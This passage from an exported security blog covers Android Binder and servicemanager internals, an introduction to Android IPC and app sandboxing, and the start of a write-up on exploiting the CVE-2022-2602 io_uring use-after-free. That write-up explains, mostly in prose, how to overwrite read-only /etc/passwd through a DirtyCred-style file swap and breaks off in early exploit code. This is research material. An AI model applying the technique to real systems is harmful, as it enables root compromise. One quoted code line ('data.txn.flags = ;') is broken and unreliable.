`PING_TRANSACTION` or `SVC_MGR_CHECK_SERVICE`).\n\nThis `binder_transaction_data` structure initializes a new `binder_io` (binder I/O) structure using `bio_init_from_txn()`, that will copy data and offsets from `binder_transaction_data` to this new one.\n\n```cpp\nstruct binder_io\n{\n    char *data;            /* pointer to read/write from */\n    binder_size_t *offs;   /* array of offsets */\n    size_t data_avail;     /* bytes available in data buffer */\n    size_t offs_avail;     /* entries available in offsets array */\n\n    char *data0;           /* start of data buffer */\n    binder_size_t *offs0;  /* start of offsets buffer */\n    uint32_t flags;\n    uint32_t unused;\n};\n```\n\n![img4](/notes/images/android/2/4.png)\n\n`bio_*` functions refers to operations on the `binder_io` structure, here is an example on how the that structure is filled from `binder_transaction_data`:\n\n```cpp\nvoid bio_init_from_txn(struct binder_io *bio, struct binder_transaction_data *txn)\n{\n    bio-\u003edata = bio-\u003edata0 = (char *)(intptr_t)txn-\u003edata.ptr.buffer;\n    bio-\u003eoffs = bio-\u003eoffs0 = (binder_size_t *)(intptr_t)txn-\u003edata.ptr.offsets;\n    bio-\u003edata_avail = txn-\u003edata_size;\n    bio-\u003eoffs_avail = txn-\u003eoffsets_size / sizeof(size_t);\n    bio-\u003eflags = BIO_F_SHARED;\n}\n```\n\nAs we can see, `buffer` and `offsets` (including their size) of `binder_transaction_data` are filled in their relative `binder_io` structure, and both structures are passed over the service manager callback function (the `svcmgr_handler` function defined in `service_manager.c` while calling `binder_loop`):\n\n```cpp\nres = func(bs, txn, \u0026msg, reply);\n  // func  -\u003e binder_handle defined in service_manager.c - binder_loop(bs, svcmgr_handler);\n  // bs    -\u003e binder_state\n  // txn   -\u003e binder_transaction_data\n  // msg   -\u003e binder_io initialized from binder_transaction_data\n  // reply -\u003e an empty binder_io that will contain the reply from the service manager\n```\n\nNow, the `BR_TRANSACTION` is inside the `svcmgr_handler`.\n\nThe `binder_transaction_data.ptr` must contain `BINDER_SERVICE_MANAGER` in order to continue (otherwise it returns `-1`) and `binder_transaction_data.code` contains the service manager command. These service commands (dispatched in a switch condition) can be:\n- `PING_TRANSACTION`: It is a ping to the servicemanager and returns 0.\n- `SVC_MGR_GET_SERVICE` - `SVC_MGR_CHECK_SERVICE`: Get a handle to a service. They follow the same switch path.\n- `SVC_MGR_ADD_SERVICE`: Add a new service\n- `SVC_MGR_LIST_SERVICES`: List all available services\n\nLet's start to dig into `SVC_MGR_GET_SERVICE`.\n\n### SVC_MGR_GET_SERVICE\n\nThis service command occurs when the binder needs a service handle based on a service name (requested from a client).\n\nThe service name is taken from the `binder_io` structure (referred as `msg` in the source code) using `bio_get_string16`. \n\nWe have different functions in the format of `bio_get_*` (`bio_get_uint32`, `bio_get_string16`, `bio_get_obj`, `bio_get_ref`) and they are all primitives of `bio_get()` that retrieves the requested data type from `(binder_io*) bio-\u003edata`. The same for `bio_put_*` functions in order to insert data in a `binder_io` structure while replying to a command.\n\n`do_find_service()` is called with the service name and the caller `UID` and `PID` from the `binder_transaction_data` structure and immediately calls `find_svc()` that will iterate its service single linked list and return an `svcinfo` structure if match the requested service name:\n\n```cpp\n{\n    struct svcinfo *next; // pointer to the next service\n    uint32_t handle;\n    struct binder_death death;\n    int allow_isolated;\n    uint32_t dumpsys_priority;\n    size_t len;\n    uint16_t name[0];\n} svcinfo;\n```\n\n![img6](/notes/images/android/2/5.png)\n\nThe `svcinfo` structure mainly contains information about the target service.\n\nIf the service matches the `svcinfo.name` item, the structure is returned to the `do_find_service` function that is responsible to perform extra checks.\n\nThe first check is about process isolation. As we were talking in the first part of this series, some services are not allowed to be called from isolated apps (such as web browsers):\n\n```cpp\n  if (!si-\u003eallow_isolated) {\n        uid_t appid = uid % AID_USER;\n        if (appid \u003e= AID_ISOLATED_START \u0026\u0026 appid \u003c= AID_ISOLATED_END) {\n            return 0;\n        }\n    }\n```\n\nIn this piece of code, the UID retrieved from `binder_transaction_data` struct (coming from the binder) is verified against the range between `AID_ISOLATED_START` and `AID_ISOLATED_END`. These UIDs (a range from 99000 to 99999) are associated with isolated processes and they can interact only with services with `svcinfo.allow_isolated` set to `true`.\n\nIf this check is passed, a selinux permission checks if the sender is allowed to retrieve the service and the handler is returned to the main switch case in the service handler. The returned handle will be put inside the `binder_io` reply using `bio_put_ref()` and returns 0, meaning everything was fine. Later on we will see how the message is sent back to the binder.\n\n### SVC_MGR_LIST_SERVICES\nWe can also list available services with the `SVC_MGR_LIST_SERVICES` command, that will iterate through the service list (`svclist`) and put the result in the `binder_io` reply message using `bio_put_string16`. There is also an interesting condition on `dumpsys_priority`. The priority, that can be defined while registering a new service, can be of three levels: CRITICAL, HIGH and NORMAL. While listing all services, we can choose to dump only services with a specific priority (specified in the `svclist` structure). \n\nFor example, using the `dumpsys` utility in Android, we can specify the desired level:\n\n```bash\nadb \u003e dumpsys -l --priority CRITICAL\nCurrently running services:\n  SurfaceFlinger\n  activity\n  cpuinfo\n  input\n  notification\n  window\n\ndumpsys -l --priority HIGH\nCurrently running services:\n  connectivity\n  meminfo\n\nadb \u003e dumpsys -l --priority NORMAL\nCurrently running services:\n  activity\n  connectivity\n  notification\n```\n\n### SVC_MGR_ADD_SERVICE\n\nIf the requested command from the binder is `SVC_MGR_ADD_SERVICE`, the binder is proxying a client request to register a new service. Details about the new service are taken from the `binder_io` message (`binder_io-\u003edata`). Service attributes are the service name, the priority level (`dumpsys_priority`), the handle and if it is permitted to interact with the service from isolated apps (`allow_isolation`). The function `do_add_service()` is called with these information and the caller UID and PID from the `binder_transaction_data` message.\n\nThis function is responsible to check for caller permissions (the process that requests the registration), starting by checking its UID to avoid the creation of a new service from standard applications. This is accomplished by checking if the `AID_APP` is over 10000.\n\nIn Android, installed applications start from UID 10000, so the condition is aimed to prevent an user application from installing a new service (or override an existing one). That also means that the privileged *system* user (with UID 1000) can register a new service. \n\nIf this condition is satisfied, a selinux check controls that the caller process has `add` permissions. If the caller process has rights to register a new service, `find_svc()` checks if the service name has been already registered. If it already exists, the service handle is overridden with the new one and `svcinfo_death()` called. \n\nBefore going in depth with this function behaviour, let's introduce the scenario where the service does not exist:\n\n```cpp\nstruct svcinfo *si;\n    /../\n      si-\u003ehandle = handle;\n        si-\u003elen = len;\n        memcpy(si-\u003ename, s, (len + 1) * sizeof(uint16_t));\n        si-\u003ename[len] = '\\0';\n        si-\u003edeath.func = (void*) svcinfo_death;\n        si-\u003edeath.ptr = si;\n        si-\u003eallow_isolated = allow_isolated;\n        si-\u003edumpsys_priority = dumpsys_priority;\n        si-\u003enext = svclist;\n        svclist = si;\n        /../\n\n```\n\n\n![img6](/notes/images/android/2/6.png)\n\nThe code is pretty self-explanatory, it is populating the new structure with input values and updates its service list with `si-\u003enext = svclist` and `svclist = si` (linked list behavior). And here, we are back with the death that we were talking some lines above.\n\nThe `binder_death` structure, part of the `svclist`, contains two items, `func` and `ptr`. The `ptr` is a pointer to its service structure (itself), and the `func` is a function pointer pointing to `svcinfo_death()`. \n\nThis death function sets the service handle to 0 and informs the binder that the service is dead using a `BC_RELEASE` with the service handle as parameter, so the binder can release this reference. The binder can use this information to also inform associated clients that the service is down using `BR_BINDER_DOWN` if clients requested for it (by sending to the binder a `BC_REQUEST_DEATH_NOTIFICATION` for that service). \n\nOn the other side, when a service is registered or overridden, a `BC_ACQUIRE` with the service handle as parameter is sent to the binder, also with the `BC_REQUEST_DEATH_NOTIFICATION` in case the service goes down (for example if its crashes).\n\n### Comeback to the service handler\nWhen one of these described commands are executed, the Binder usually expects a reply back. While handling commands, `SVC_MGR_ADD_SERVICE` puts 0 in reply message if success (`bio_put_uint32(reply, 0);`) or simply return `-1` if something fails and the binder will receive an empty reply (that was previously initialized using `bio_init()`).\n\n`SVC_MGR_GET_SERVICE` and `SVC_MGR_LIST_SERVICES` act in the same way if something goes wrong (`-1` and empty reply packet) or they return 0 to the function after have filled the reply packet with necessary values (the handle in case of the get service and a list of services in case of a service list command).\n\nWhen the service handler returns, the execution flow comes back inside the `binder_parse` function (in the `BR_TRANSACTION` switch case) with the reply packet and the result value of the servicemanager handler. Based on the `binder_transaction_data.flags`, if `TF_ONE_WAY` is set it means that is an asynchronous call and the binder does not expect a reply, so the servicemanager will inform the binder to free the `binder_transaction_data.ptr.buffer` with a `BC_FREE_BUFFER` command (internally using the `binder_free_buffer` function). If it's not an asynchronous call, it will send the reply back to the binder using `binder_send_reply()` that will send a `BC_REPLY` command.\n\nAlso, as you could notice, all these functions (`binder_send_reply`, `binder_free_buffer`, ..) are meant to be easily called inside the source code, and will perform all setup operations to interact with the binder with the final `ioctl` operation. Let's take a simple example of the `binder_free_buffer` mentioned before.\n\n```cpp\nvoid binder_free_buffer(struct binder_state *bs,\n                        binder_uintptr_t buffer_to_free)\n{\n    struct {\n        uint32_t cmd_free;\n        binder_uintptr_t buffer;\n    } __attribute__((packed)) data;\n\n    data.cmd_free = BC_FREE_BUFFER;\n    data.buffer = buffer_to_free;\n    binder_write(bs, \u0026data, sizeof(data));\n}\n```\n\nThis function, previously used by the service manager handler to inform the binder to free a buffer, will setup, using a `data` structure, a `cmd_free` with `BC_FREE_BUFFER` on it and the buffer to free, then call `binder_write`. `binder_write` is the final function that will put received input inside a `binder_write_read.write_buffer` structure before performing the `ioctl` to the binder with the `BINDER_WRITE_READ` command:\n\n```cpp\nint binder_write(struct binder_state *bs, void *data, size_t len)\n{\n    struct binder_write_read bwr;\n    int res;\n\n    bwr.write_size = len;\n    bwr.write_consumed = 0;\n    bwr.write_buffer = (uintptr_t) data;\n    bwr.read_size = 0;\n    bwr.read_consumed = 0;\n    bwr.read_buffer = 0;\n    res = ioctl(bs-\u003efd, BINDER_WRITE_READ, \u0026bwr);\n    if (res \u003c 0) {\n        fprintf(stderr,\"binder_write: ioctl failed (%s)\\n\",\n                strerror(errno));\n    }\n    return res;\n}\n```\n\nWe can note the differences on the usage of the `binder_write_read` structure now and before. When we were expecting an action from the binder (in the `binder_loop`) the received action was inside the `read_buffer` (that contains the `BR_*` command). Now, the binder needs to perform actions based on our input, so we are using the `write_buffer` (with a `BC_*` command).\n\nSaid that, we can come back inside the `binder_send_reply` that is responsible to send the reply of performed actions to the binder. This is the source code:\n\n```cpp\n\nvoid binder_send_reply(struct binder_state *bs,\n                       struct binder_io *reply,\n                       binder_uintptr_t buffer_to_free,\n                       int status)\n{\n    struct {\n        uint32_t cmd_free;\n        binder_uintptr_t buffer;\n        uint32_t cmd_reply;\n        struct binder_transaction_data txn;\n    } __attribute__((packed)) data;\n\n    data.cmd_free = BC_FREE_BUFFER;\n    data.buffer = buffer_to_free;\n    data.cmd_reply = BC_REPLY;\n    data.txn.target.ptr = 0;\n    data.txn.cookie = 0;\n    data.txn.code = 0;\n    if (status) {\n\t    // the svcmgr_handler return -1\n\t\tdata.txn.flags = ;\n\t\tdata.txn.data_size = sizeof(int);\n\t\tdata.txn.offsets_size = 0;\n\t\tdata.txn.data.ptr.buffer = (uintptr_t)\u0026status;\n\t\tdata.txn.data.ptr.offsets = 0;\n    } else {\n        // the svcmgr_handler return 0\n        data.txn.flags = 0;\n        data.txn.data_size = reply-\u003edata - reply-\u003edata0;\n        data.txn.offsets_size = ((char*) reply-\u003eoffs) - ((char*) reply-\u003eoffs0);\n        data.txn.data.ptr.buffer = (uintptr_t)reply-\u003edata0;\n        data.txn.data.ptr.offsets = (uintptr_t)reply-\u003eoffs0;\n    }\n    binder_write(bs, \u0026data, sizeof(data));\n}\n\n```\n\nNote the declared `data` structure, it contains an integer `cmd_free` (that will be `BC_FREE_BUFFER`), the `buffer`, the `cmd_reply` (that will be `BC_REPLY`) and a `binder_transaction_data` structure. \n\nThe buffer to free is `binder_transaction_data.data.ptr.buffer` (previously casted in `binder_io` and contains parameters like the service name for the servicemanager) and then the structure is filled based on the `status` value. \n\nThe `status` value is the return value from the servicemanager handler (`svcmgr_handler`) that can be 0 if everything was fine (and the reply was filled) or `-1` if something went wrong. \nIf the result is `-1` it is copied inside the `data.txn.data.ptr.buffer` (so inside the `binder_transaction_data` of the data structure). \n\nIf the result of the service manager handler was fine (0), the `binder_transaction_data` is filled with reply's data/offsets buffers and passed over the `binder_write` function, that, as explained before, will take the data structure and put it in `binder_write_read.write_buffer` before calling `ioctl` with the `BINDER_WRITE_READ` command.\n\n## Little resume\nThe servicemanager is started by the init process (as defined in `/init.rc`) and first of all it becomes the context manager for the binder. Then he notices the binder that will enter an infinite loop (`BC_ENTER_LOOPER`) and starts to read and parse operations delivered from the binder. When such events are related to service lookup or service registration (`SVC_MGR_GET_SERVICE` and `SVC_MGR_ADD_SERVICE`) the binder requests the servicemanager for a `BR_TRANSACTION` with one of these commands inside its `binder_transaction_data` structure. The servicemanager checks for necessary rights on the caller process (information sent from the binder) and, in case of a service lookup, returns a handle to the binder. When it's done, the reply is sent to the binder using `ioctl` with `BINDER_WRITE_READ` with the reply inside the `write_buffer` and the `BC_REPLY` command.\n\n## Conclusions\nIn this post, we concentrated on transactions between the Binder and the servicemanager, a crucial component for IPC.","lastmodified":"2025-04-14T13:32:05.60308601Z","tags":null},"/notes/Android-Internals-IPC-Introduction":{"title":"Android Internals IPC: Introduction","content":"\n## Introduction\nIn the last few months I was studying Android Internals in order to perform some security research in the future. I first tried to focus myself in its architecture and fundamentals components, starting from the bootloader stage to the Framework, in order to have an initial high level picture. Then, I focused on the Binder component for two reasons:\n- It is one of the main Android components, vital for its functionalities, as it is the IPC core.\n- In that period Google P0 discovered a 0day in the wild used in a chain to compromise the Android System. The Binder was impacted allowing LPE as root also from an isolated process (that means it is for sure a good attack vector)\n\n\nDuring this studying process, I took a lot of messy notes, so after 1/2 months of not working anymore on Android, I took them back, put them in order, studied again (adding more messy notes) and decided to write this little series of articles. So, especially the second and the third sections contain theory concepts, high level functionalities and a lot of source code references. Parts of these articles can be considered as a ‘Code Walkthrough’, so having the actual Android Source Code (the online Android repository is enough) is highly suggested to understand the flow.\nI didn’t want to repost other people's work, so this ‘code walkthrough’ is something different that honestly could help me when I was starting on it, so I hope it can help others too. It could not be perfect, so feel free to appoints something at \u003calessandro [at] hacktivesecurity.com\u003e and I will of course consider them.\nBy the way, all references are at the bottom of each article.\n\nIn this first section, I will introduce some basic Android concepts that will be useful for next chapters. The second will deepen Binder interactions and the servicemanager. And last, but not least, the client and service IPC implementation and usage.\n\n## IPC Introduction\nInter-Process Communication is a necessary and indispensable feature for every Operating System in order to let processes communicate with each other. That means, if Process A needs to communicate with Process B (synchronize, share data, .. ), the OS must provide capabilities to do that.\nWe have multiple and different solutions that we can apply depending on the underlying OS, they can be through Pipes, Sockets, Shared Files, Shared Memory and more. These implementations are out of scope of this article’s series, so these are well-written reference:\n\n- Linux: [https://www.geeksforgeeks.org/inter-process-communication-ipc/](https://www.geeksforgeeks.org/inter-process-communication-ipc/)\n- OSX: [https://developer.apple.com/documentation/uikit/inter-process_communication](https://developer.apple.com/documentation/uikit/inter-process_communication)\n- Windows: [https://docs.microsoft.com/en-us/windows/win32/ipc/interprocess-communications](https://docs.microsoft.com/en-us/windows/win32/ipc/interprocess-communications)\n\nIn order to go over the IPC implementation in Android, let’s make a short introduction to Android functionalities and some security aspects that will be useful during the reading.\n\n## Android and Linux\nStarting from the classic. Android is a Linux kernel based distribution aimed for mobile devices. I cannot explain better than how was explained in *‘Android Internals’* by ‘Jonathan Levin’:\n\n*“Android's novelty arises from what it aims to provide -**not just another Linux distribution** - but a full software stack. The term \"stack\" implies several layers. **Android provides not just the basic kernel and shell binaries, but also a self-contained GUI environment, and a rich set of frameworks**. Coupled with a simple to use development language - Java - Android gives developers a true **Rapid Application Development (RAD) environment**, as they can draw on prewritten, well-tested code in the frameworks to access advanced functionality - such as Cameras, motion sensors, GUI Widgets and more - in a few lines of code”*\n\nOne of the biggest differences with Linux is **Bionic** has its core runtime C library, instead of the standard GNU libC (Glibc). Bionic is lighter and more focused on Android’s needs. There are a lot of changes between them. Today we are focused on IPC, so the difference in our interest is the omission of the System-V IPC (message queues, shared memory and semaphores), that are omitted because Android chooses its own IPC mechanism, the **Binder**. The Binder is a kernel component, the core component of IPC, that enables different processes to communicate with each other using a client-server architecture. It’s the core theme of this series, so we will deppen in later chapters.\n\n## Dalvik and ART\nJust to be aligned, let’s spend some words about the Dalvik Virtual Machine and ART, which are the core of Android.\nIf you know how Java works, you also know that in order to execute the code you need the JVM (**J**ava **V**irtual **M**achine) that will execute the compiled bytecode, translating it to machine code.\nWell, Dalvik follows the same concept, but it’s not the same!\nThe Dalvik VM runs a different type of bytecode, called DEX (**D**alvik **E**xecutable) that is more optimized for efficiency in order to run faster on low performance hardware as it is for mobile devices. It is a Just In Time (JIT) compiler, that means that the code is compiled dynamically when it needs to be executed.\n**A**ndroid **R**un**T**ime (ART) is used for the same purpose: translate bytecode to machine code and execute it.\nBy the way, it uses a different approach instead of JIT compiling , it uses **A**head **O**f **T**ime (AOT) that translates the whole DEX into machine code (dex2oat) at installation time when the APK is installed or when the device is idle. That means that is much more faster at execution time, but also requires more physical space.\n\nDalvik is the predecessor of ART. ART has been introduced in Android 4.4 (KitKat) and started to use hybrid combination of AOT and JIT from Android 7.0 (Nougat), starting to follows a different compilation approach, synthesizing:\n\n- The first few times the application runs, the app is executed through JIT compilation.\n- When the device is idle or charging, a daemon performs compilation using AOT on frequently used code, based on a profile compilation generated from the first run\n\nYou can find these profiles for each installed application inside */data/dalvik-cache/profiles/*:\n\n![img1](/notes/images/android/1/1.png)\n\n## Android Framework and abstraction\nDevelopers can access complex functionalities with few lines of code using pre-written code that resides in the Framework, delivered in packages that start with com.android.\\* . These packages can be for different scopes, such as location and application support (*android.location* and *android.app*) Network (*android.net*) and in our interest, IPC support and core OS services from android.os. ([developer.android.com/packages](https://developer.android.com/reference/packages.html) for more).\nThis is a high advantage from the Security Perspective. Usually, developers do not have to bother with native languages (avoiding common memory corruption issues) and instead use a well tested code, also when they need to perform advanced or low level functionalities (such as access an hardware peripheral) they can stay in an High Level, Memory Safe language.\n\nLet’s take a quick example on how to interact with the WiFi component, supposing we need to retrieve the actual WiFi state:\n\n```\nimport android.net.Wifi \n// Get an handle to the WiFi Service\n[..]\nWifiManager Wifi_manager = (WifiManager) GetApplicationContext().getSystemService(Context.WIFI_SERVICE);\n// Get the WifiState\nWifi_manager.getWifiState();\n[...]\n```\n\nWith these 2 lines of code we have completed our task:\n- Get a handle to the WiFi service. The return result of getSystemService() is a generic Object (the handle to the service) that needs to be casted based on the desired service.\n- From the retrieved manager, we can directly call the desired function, that will perform an IPC and return the result back.\n\nThat’s how Android abstract service interactions, enhancing security by simplifying application’s code.\n\nBy the way sometimes, due to performance reasons too, there is the necessity to run native code inside an application. This is performed using JNI, that permits to call native functions inside a shared library in the application context. This is pretty common for messaging applications (for example, whatsapp uses [PJSP](https://www.pjsip.org/), a C library, for video conferences).\n\n## Java Native Interface\nAs we said, sometimes there is the necessity to use native code such as C/C++ from standard applications. This is permitted using the JNI (Java Native Interface) that lets Java call native functions without drastic differences. The native code is exported in shared libraries inside the lib/ folder (of the APK) where we have binaries compiled for multiple architectures (32/64 bit ARM, x86/x86-64 ), and the the underline system will choose the appropriate one (based on its hardware).\nLet’s take an example with Whatsapp:\n\n![img2](/notes/images/android/1/2.png)\n\nIn this case, inside the lib/ folder there is only the armeabi-v7a folder. That’s because my test device is a 32 bit ARM (https://developer.android.com/ndk/guides/abis) and the system optimized physical space removing unused binaries compiled for other platforms.\nThese native functions are interesting from a security perspective because they can include **memory corruption issues**.\nIn order to track native calls, we can search through the Java code (decompiled) for native declarations:\n\n![img3](/notes/images/android/1/3.png)\n\nThat’s how a native function is declared, with the native keyword, and later on called as it is a normal Java function.\nIf you want to extract exported symbols from shared libraries, the nm utility can be come handy (*nm -D * | grep \\\u003cfunc_name\\\u003e* inside the specific ABI folder can be enough).\n\nIf you find an exploitable memory corruption in one application, you also have to consider the application sandbox. If you successfully compromise an application through a remote code execution, you are closed in a sandbox, where you can interact only with application’s related files and functionalities (and its declared android permissions). Of course, this can be part of a chain, with a foothold inside the system you have more attack surface in order to elevate privileges and compromise the system.\n\n## Application Sanbox\nCVE-2019-11932 is a Whatsapp Remote Code execution caused by a memory corruption while handling GIF animations ([here is a demo POC](https://www.youtube.com/watch?v=loCq8OTZEGI)). This was a critical issue because, also if you are in a sandbox, you can access all whatsapp files (chat databases, backup, media , ..) and, as we know, nowadays whatsapp is the main messaging application.\nAs we said, Android is a Linux based OS and inherits a lot of its concepts. In this way, Android uses kernel-level Application Sandbox using the UID (Unique User ID). Every application on Android has its own UID and GUID for file permissions and running application process (UID starts from 1000). All applications have a dedicated workspace in */data/data/\\\u003capp_name\\\u003e* created at the installation time where permissions permits only the application user to read and write in these files:\n\n![img4](/notes/images/android/1/4.png)\n\nAs you can see, only the user u0_a106 (10106, the UID for the WhatsApp application in my Droid) can access these files, meaning that any other application cannot read its content (only him and the root user).\nFor some applications (like browsers) there is an additional isolation that literally ‘isolates’ the application using a different UID. These IDs are referred in the Kernel source code as AID_ISOLATED_START (which is 99000) and AID_ISOLATED_END (99999) and limit service interactions. For example, the following snippet is part of the Android Kernel in order to obtain an handle to a service:\n\n\n```\nuint32_t do_find_service(const uint16_t *s, size_t len, uid_t uid, pid_t spid)\n{\n   //find_svc will retrieve a service info structure\n   struct svcinfo *si = find_svc(s, len);\n/.../\n   //check if the requested service allow interaction from isolated apps\n   if (!si-\u003eallow_isolated) {\n       // If this service doesn't allow access from isolated processes,\n       // then check the uid to see if it is isolated.\n       uid_t appid = uid % AID_USER;\n       if (appid \u003e= AID_ISOLATED_START \u0026\u0026 appid \u003c= AID_ISOLATED_END) {\n           return 0;\n       }\n   }\n/../\nreturn si-\u003ehandle\n\n```\n\nWe will deepin in next chapters about the full process to obtain a service handle, but from this snippet you can see where the isolation check is performed. A check is done in the svcinfo structure (structure with service information such as the name, the isolation level and more) and if the target service is not allowed to be called from isolated processes (the caller UID is between AID_ISOLATED_START and AID_ISOLATED_END) the service handle is not returned.\n\nFor example, this is the chrome browser inside an isolated process:\n\n![img5](/notes/images/android/1/5.png)\n\nYou can note that the user id is 99008 (\u003e99000), meaning it is an isolated application process.\n\n## Conclusion\nIn this first article, we introduced basic Android concepts and security aspects that will become handy for next chapters. In the next article, we are going to talk about the Binder, its transactions and the servicemanager.\n\n## References\n[http://newandroidbook.com/](http://newandroidbook.com/)\n[https://source.android.com/devices/tech/dalvik](https://source.android.com/devices/tech/dalvik)\u003c\n[https://source.android.com/security/app-sandbox](https://source.android.com/security/app-sandbox)","lastmodified":"2025-04-14T13:32:05.60308601Z","tags":null},"/notes/DirtyCred-File-Exploitation-applied-on-an-io_uring-UAF-CVE-2022-2602":{"title":"CVE-2022-2602: DirtyCred File Exploitation applied on an io_uring UAF","content":"\n## Introduction\nIn the past few weeks, I worked with [@LukeGix](https://exploiter.dev) (checkout his blog post on the same vulnerability [here](https://exploiter.dev/blog/2022/CVE-2022-2602.html)) to exploit the CVE-2022-2602, a very interesting bug from multiple perspectives without a public exploit, that impacts the io_uring subsystem with an Use-After-Free vulnerability handling registered file descriptors.\nWe used a Data-Only attack against kernel version 5.15.74 (the latest before the patch) taking inspiration from the DirtyCred technique recently presented at [BlackHat USA](https://zplin.me/papers/DirtyCred.pdf). \n\n## TL;DR\nThe vulnerability is an Use-After-Free that impacts the registered file descriptor functionality in the io_uring subsystem. It's possible to register a file in the io_uring context, free it from the Unix Garbage Collector and re-use it with the requested io_uring operation (for example, a `writev` operation). To exploit the bug, it was a matter of replace the freed file structure with a read-only file (e.g. /etc/passwd), in order to write into it, and achieve a good timing with a small race window.\n\n## Vulnerability\n### Root cause\nThe vulnerability is an Use-After-Free in the io_uring subsystem while handling registered files. The [IORING_REGISTER_FILES](https://manpages.debian.org/unstable/liburing-dev/io_uring_register.2.en.html#IORING_REGISTER_FILES) functionality permits to register file descriptors in the io_uring context so that the consumer (the user-land application) do not have to keep them open. It works by passing the list of file descriptors using the [io_uring_register](https://manpages.debian.org/unstable/liburing-dev/io_uring_register.2.en.html) syscall. However, the Unix Garbage collector (well explained in [this project zero blog post](https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html)), which its entrypoint is the [unix_gc](https://elixir.bootlin.com/linux/v5.15.74/source/net/unix/garbage.c#L205) function and its responsability is to de-allocate in-flight sockets, can free these registered files while io_uring is using them, causing an Use-After-Free vulnerability.\n\nThe vulnerability has been [discovered and described](https://seclists.org/oss-sec/2022/q4/57?utm_source=dlvr.it\u0026utm_medium=twitter) from \"Thadeu Lima de Souza Cascardo\" as following:\n\u003e The vulnerability is a use-after-free that happens when an io_uring request is being processed on a registered file and the Unix GC runs and frees the io_uring fd and all the registered fds. The order at which the Unix GC processes the inflight fds may lead to registered fds be freed before the io_uring is released and has the chance to unregister and wait for such requests to finish.\n\nPutting simple, in order to trigger the vulnerability, we have to register a file descriptor that can be used in an io_uring operation (like a `writev`) using [SQPOLL](https://unixism.net/loti/tutorial/sq_poll.html) and block the write operation using userfault (as demonstrated in the public POC, however we will use something else in our exploit) that will block the kernel thread. Now, close the io_uring context from user-land, triggers `unix_gc` function in some way (that will free the allocated registered file) and resumes the faulted kernel thread by releasing the userfault. In that way, the UAF should be triggered (with KASAN enabled, you can see a bug report).\n\n### Fix\nThe [fix](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=0091bfc81741b8d3aeb3b7ab8636f911b2de6e80) commit idea is pretty simple: Leave io_uring alone and let it handle these resources by itself [ignoring its registered files](https://elixir.bootlin.com/linux/latest/source/net/unix/garbage.c#L301). \nSimple and effective.\n\n## Exploitation\n### Exploitation strategies\nThe vulnerability can be approached using different techniques. Since the targeted [struct file](https://elixir.bootlin.com/linux/v5.15.75/source/include/linux/fs.h#L966) is in a dedicated cache (`filp`) a cross cache attack can be a viable approach, since the targeted object has a lot of interesting pointers and behaviours. However, we considered this possibility initially but we thought it would be a lot more reliabale to go with a data only technique. Replace the file struct with one in our control, perform some spray, and it could be possible (since the object is freed). Well, the idea was interesting, but we messed with a lot of things and, also if the exploit turned out quite simple, we put a lot of effort on it.\n\n### DirtyCred: File Exploitation\nThe DirtyCred attack is a technique presented this year at [Black Hat 2022](https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf). We are not going to further re-explain it since it has been already documented [in its original paper](https://zplin.me/papers/DirtyCred.pdf), but what is in our intereset is the \"File Exploitation\" part:\n![[notes/images/cve-2022-2602 bh.png|800]] - *Image from [BH slides](https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf)*\n\n\nThe idea is pretty simple: If you replace a freed R/W file (while a kernel thread is writing into it) with a read-only file, you can write into that read-only file.\nBut, why and how? Let's start with the why. File permissions are [checked once](https://elixir.bootlin.com/linux/latest/source/fs/read_write.c#L568) before writing with the `write` syscall, once it starts writing (`file-\u003ef_op-\u003ewrite`) no more permissions checks are performed. So, if you are able to replace the `struct file` (retrieved from the `fd` integer number installed for that specific context) with an arbitrary one (e.g. a read-only file) **after** permissions are granted and **before** its write operation, you can write into arbitrary files bypassing permission validations. \nWell, but how? Mainly suspending the kernel execution thread when it starts writing, using [userfault](https://blog.hacktivesecurity.com/index.php/2022/06/13/linux-kernel-exploit-development-1day-case-study/), [FUSE](https://exploiter.dev/blog/2022/FUSE-exploit.html) or abusing file locking (Slow Write).\n\nWe choose to go with the file locking methodology in order to write an universal exploit that does not depend on specific configurations (also FUSE could be a good alternative, since unprivilged userfault has become a standard mitigation).\n\nI would like to tell some observations on this slow write technique, so let's see it from the kernel perspective.\n\n### File locking (Slow Write)\nThe file locking mechanism is a must feature for a kernel: If two concurrency processes are writing into the same file, the kernel must be able to account that and deal with it without loss of integrity. How the kernel does that? Using file locks.\n[Locking](https://en.wikipedia.org/wiki/Lock_(computer_science)) is a synchronization primitive that permits to handle access to the same resource in a multi-thread environment. \n[ext4_buffered_write_iter](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L253) is the function responsible to acquire this lock when a vectored write is requested (as in our case with io_uring), in a `ext4` file-sysytem, using the [inode_lock](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L263) (and later release it with [inode_unlock](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L273)), where the `inode` is our target file inode representation. If another thread is already writing into that node, the kernel thread is paused until the lock from the the other thread is released. When the other thread releases the file lock (calling `inode_unlock`), the sleeping kernel thread can resumes its execution acquiring the lock and starting to write into the file. But what if, during the sleep time, the `struct file` is replaced? Since permissions checks have been already done, the write action will be performed also if the re-allocated file has O_RDONLY permissions!\nIf you look closely in the [ext4_buffered_write_iter](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L253), you can see that the pointer to the struct file is retrieved from [iocb-\u003eki_filp](https://elixir.bootlin.com/linux/v5.15.75/source/include/linux/fs.h#L327), and the following calls will use that pointer to perform the write operation ([generic_perform_write](https://elixir.bootlin.com/linux/v5.15.75/C/ident/generic_perform_write)).\nWe used this technique to \"stays\" the object in the kernel and extend the race window, without using \"userfault\".\n\n#### fatal_signal_pending\nAn issue we encountered while developing the exploit was the [fatal_signal_pending](https://elixir.bootlin.com/linux/v5.15.75/C/ident/fatal_signal_pending) call from [generic_perform_write](https://elixir.bootlin.com/linux/v5.15.75/C/ident/generic_perform_write). This check ensures that the `current` context does not have fatal signals hanging, for example by avoiding the write operation if the process has been already closed. This was one of the issues we had to overcome that took us quite some time, since debugging these kinds of operations leads to non truthful behaviours. By the way, the resolution was just to wait until io_uring has finished its operation by monitoring our target file size:\n\n```C\nint main(){\n\t/* .. */\n\tstat(\"/etc/passwd\", \u0026st);\n\tint original_passwd_size = st.st_size;\n\t/* .. */\n\twhile(original_passwd_size == 